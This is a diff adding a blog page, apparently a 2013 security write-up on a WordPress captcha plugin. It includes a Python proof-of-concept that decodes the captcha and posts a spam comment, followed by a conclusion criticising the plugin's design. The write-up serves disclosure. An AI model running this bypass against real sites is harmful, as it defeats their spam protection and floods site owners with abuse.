+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">el</span> <span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;cptch_block&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">except</span> <span class="ne">IndexError</span> <span class="k">as</span> <span class="n">ierr</span><span class="p">:</span>
+            <span class="n">no_plugin</span><span class="p">(</span><span class="s">&#39;find_class cptch_block&#39;</span><span class="p">)</span> <span class="c"># No such CSS class found means most likely the plugin is not installed.</span>
+
+        <span class="n">captcha</span> <span class="o">=</span> <span class="n">el</span><span class="o">.</span><span class="n">text_content</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
+                <span class="k">try</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span>
+                                <span class="n">result</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span>
+                                <span class="n">time</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
+                        <span class="k">pass</span>
+
+        <span class="n">el</span><span class="o">=</span> <span class="n">dom</span><span class="o">.</span><span class="n">find_class</span><span class="p">(</span><span class="s">&#39;form-submit&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">el</span><span class="o">.</span><span class="n">getchildren</span><span class="p">():</span>
+                <span class="k">try</span><span class="p">:</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span>
+                                <span class="n">post_id</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                        <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span>
+                                <span class="n">comment_parent</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">attrib</span><span class="p">[</span><span class="s">&#39;value&#39;</span><span class="p">]</span>
+                <span class="k">except</span> <span class="ne">KeyError</span><span class="p">:</span>
+                        <span class="k">pass</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Captcha is &quot;{}&quot;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">captcha</span><span class="p">))</span>
+
+        <span class="c"># Try to crickiticrack it :P [Well we just use the decode() functon]</span>
+        <span class="n">solution</span> <span class="o">=</span> <span class="n">reverse</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">time</span><span class="p">)</span>
+
+        <span class="k">print</span><span class="p">(</span><span class="s">&#39;[+] Found solution: &quot;{}&quot;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">solution</span><span class="p">))</span>
+
+        <span class="c"># No write a comment with the cracked captcha to proof that we provided the</span>
+        <span class="c"># correct solution.</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;author&#39;</span><span class="p">:</span> <span class="s">&#39;spammer&#39;</span><span class="p">,</span> <span class="s">&#39;email&#39;</span><span class="p">:</span> <span class="s">&#39;spammer@spamhouse.org&#39;</span><span class="p">,</span> <span class="s">&#39;url&#39;</span><span class="p">:</span> <span class="s">&#39;http://spamming.com&#39;</span><span class="p">,</span>
+        <span class="s">&#39;cptch_result&#39;</span><span class="p">:</span> <span class="n">result</span><span class="p">,</span> <span class="s">&#39;cptch_time&#39;</span><span class="p">:</span> <span class="n">time</span><span class="p">,</span> <span class="s">&#39;cptch_number&#39;</span><span class="p">:</span> <span class="n">solution</span><span class="p">,</span>
+        <span class="s">&#39;comment&#39;</span><span class="p">:</span> <span class="s">&quot;Hi there! No protection from spammers!!!!:D&quot;</span><span class="p">,</span> <span class="s">&#39;submit&#39;</span><span class="p">:</span> <span class="s">&#39;Post+Comment&#39;</span><span class="p">,</span>
+        <span class="s">&#39;comment_post_ID&#39;</span><span class="p">:</span> <span class="n">post_id</span><span class="p">,</span> <span class="s">&#39;comment_parent&#39;</span><span class="p">:</span> <span class="n">comment_parent</span><span class="p">}</span>
+
+        <span class="k">try</span><span class="p">:</span>
+                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">COMMENT_POST</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span> <span class="k">as</span> <span class="n">cerr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Network problem occured: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cerr</span><span class="p">))</span>
+        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">terr</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;Connection timeout: {}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">terr</span><span class="p">))</span>
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">r</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+                <span class="k">print</span><span class="p">(</span><span class="s">&#39;HTTP Error:&#39;</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</pre></div>
+
+
+<h3>Conclusion</h3>
+<p>Let me summarize:</p>
+<ul>
+<li>The captcha implementation of the plugin is bad because it does not
+    prevent computers from solving it (The idea behind serving
+    mathematical equations in this form is highly debatable).</li>
+<li>The captcha author implements his own encryption function, which is
+    almost always a very bad idea as long as your name is not Bruce
+    Scheier or you aren't a mathematician.</li>
+<li>The captcha plugin stores clear text passwords in the source code
+    visible to anyone.</li>
+<li>The captcha plugin has a very big user base (Over one million
+    downloads) and a alarming high rating.</li>
+<li>The <a href="http://bestwebsoft.com/" title="BestWebSoft">authors</a> earn money with
+    this shitty software and the users are left completely unsecured.</li>
+</ul>
+<p>Maybe the worst part of all this is, that there's also a premium version
+of this plugin. And the most frightening observance: Most users are
+completely unaware of the consequences from using such software (Derived
+by the average high ratings for this plugin). For instance, I found the
+following business comment on the vendor site. This is absolutely
+ridiculous.</p>
+<p><a href="/uploads/2013/11/Screenshot-from-2013-11-04-072343.png"><img alt="Client from BestWebSoft ordering captcha for several thousand dollars without knowing the
+quality." src="/uploads/2013/11/Screenshot-from-2013-11-04-072343-1024x576.png" /></a></p>
+<p>Anyways, that's been it! Send me letter for Xmas!</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="/tag/captcha.html">Captcha</a>
+      <a href="/tag/security.html">Security</a>
+      <a href="/tag/programming.html">Programming</a>
+      <a href="/tag/exploit.html">Exploit</a>
+    </p>
+  </div>
+</article>
+
+    <footer>
+      <p>&copy; Nikolai Tschacher 2015</p>
+<p>Built using <a href="http://getpelican.com" target="_blank">Pelican</a> - <a href="https://github.com/alexandrevicenzi/flex" target="_blank">Flex</a> theme by <a href="http://alexandrevicenzi.com" target="_blank">Alexandre Vicenzi</a></p>    </footer>
+  </main>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "name": "A tale of a twofold broken wordpress captcha plugin",
+  "headline": "A tale of a twofold broken wordpress captcha plugin",
+  "datePublished": "2013-11-04 02:02:00+01:00",
+  "dateModified": "",
+  "author": {
+    "@type": "Person",
+    "name": "Nikolai Tschacher",
+    "url": "/author/nikolai-tschacher.html"
+  },
+  "image": "{{ SITEURL }}/{{ THEME_STATIC_DIR }}/img/profile.png",
+  "url": "/a-tale-of-a-twofold-broken-wordpress-captcha-plugin.html",
+  "description": "Last Edit (Effective: 7th November 2013) It seems like the plugin authors updated the security of the plugin. All the bottom blog entry deals with version 3.8.7. In this new paragraph, I will look whether these recent updates to version 3.8.8 added the necessary security to ..."
+}
+</script></body>
+</html>
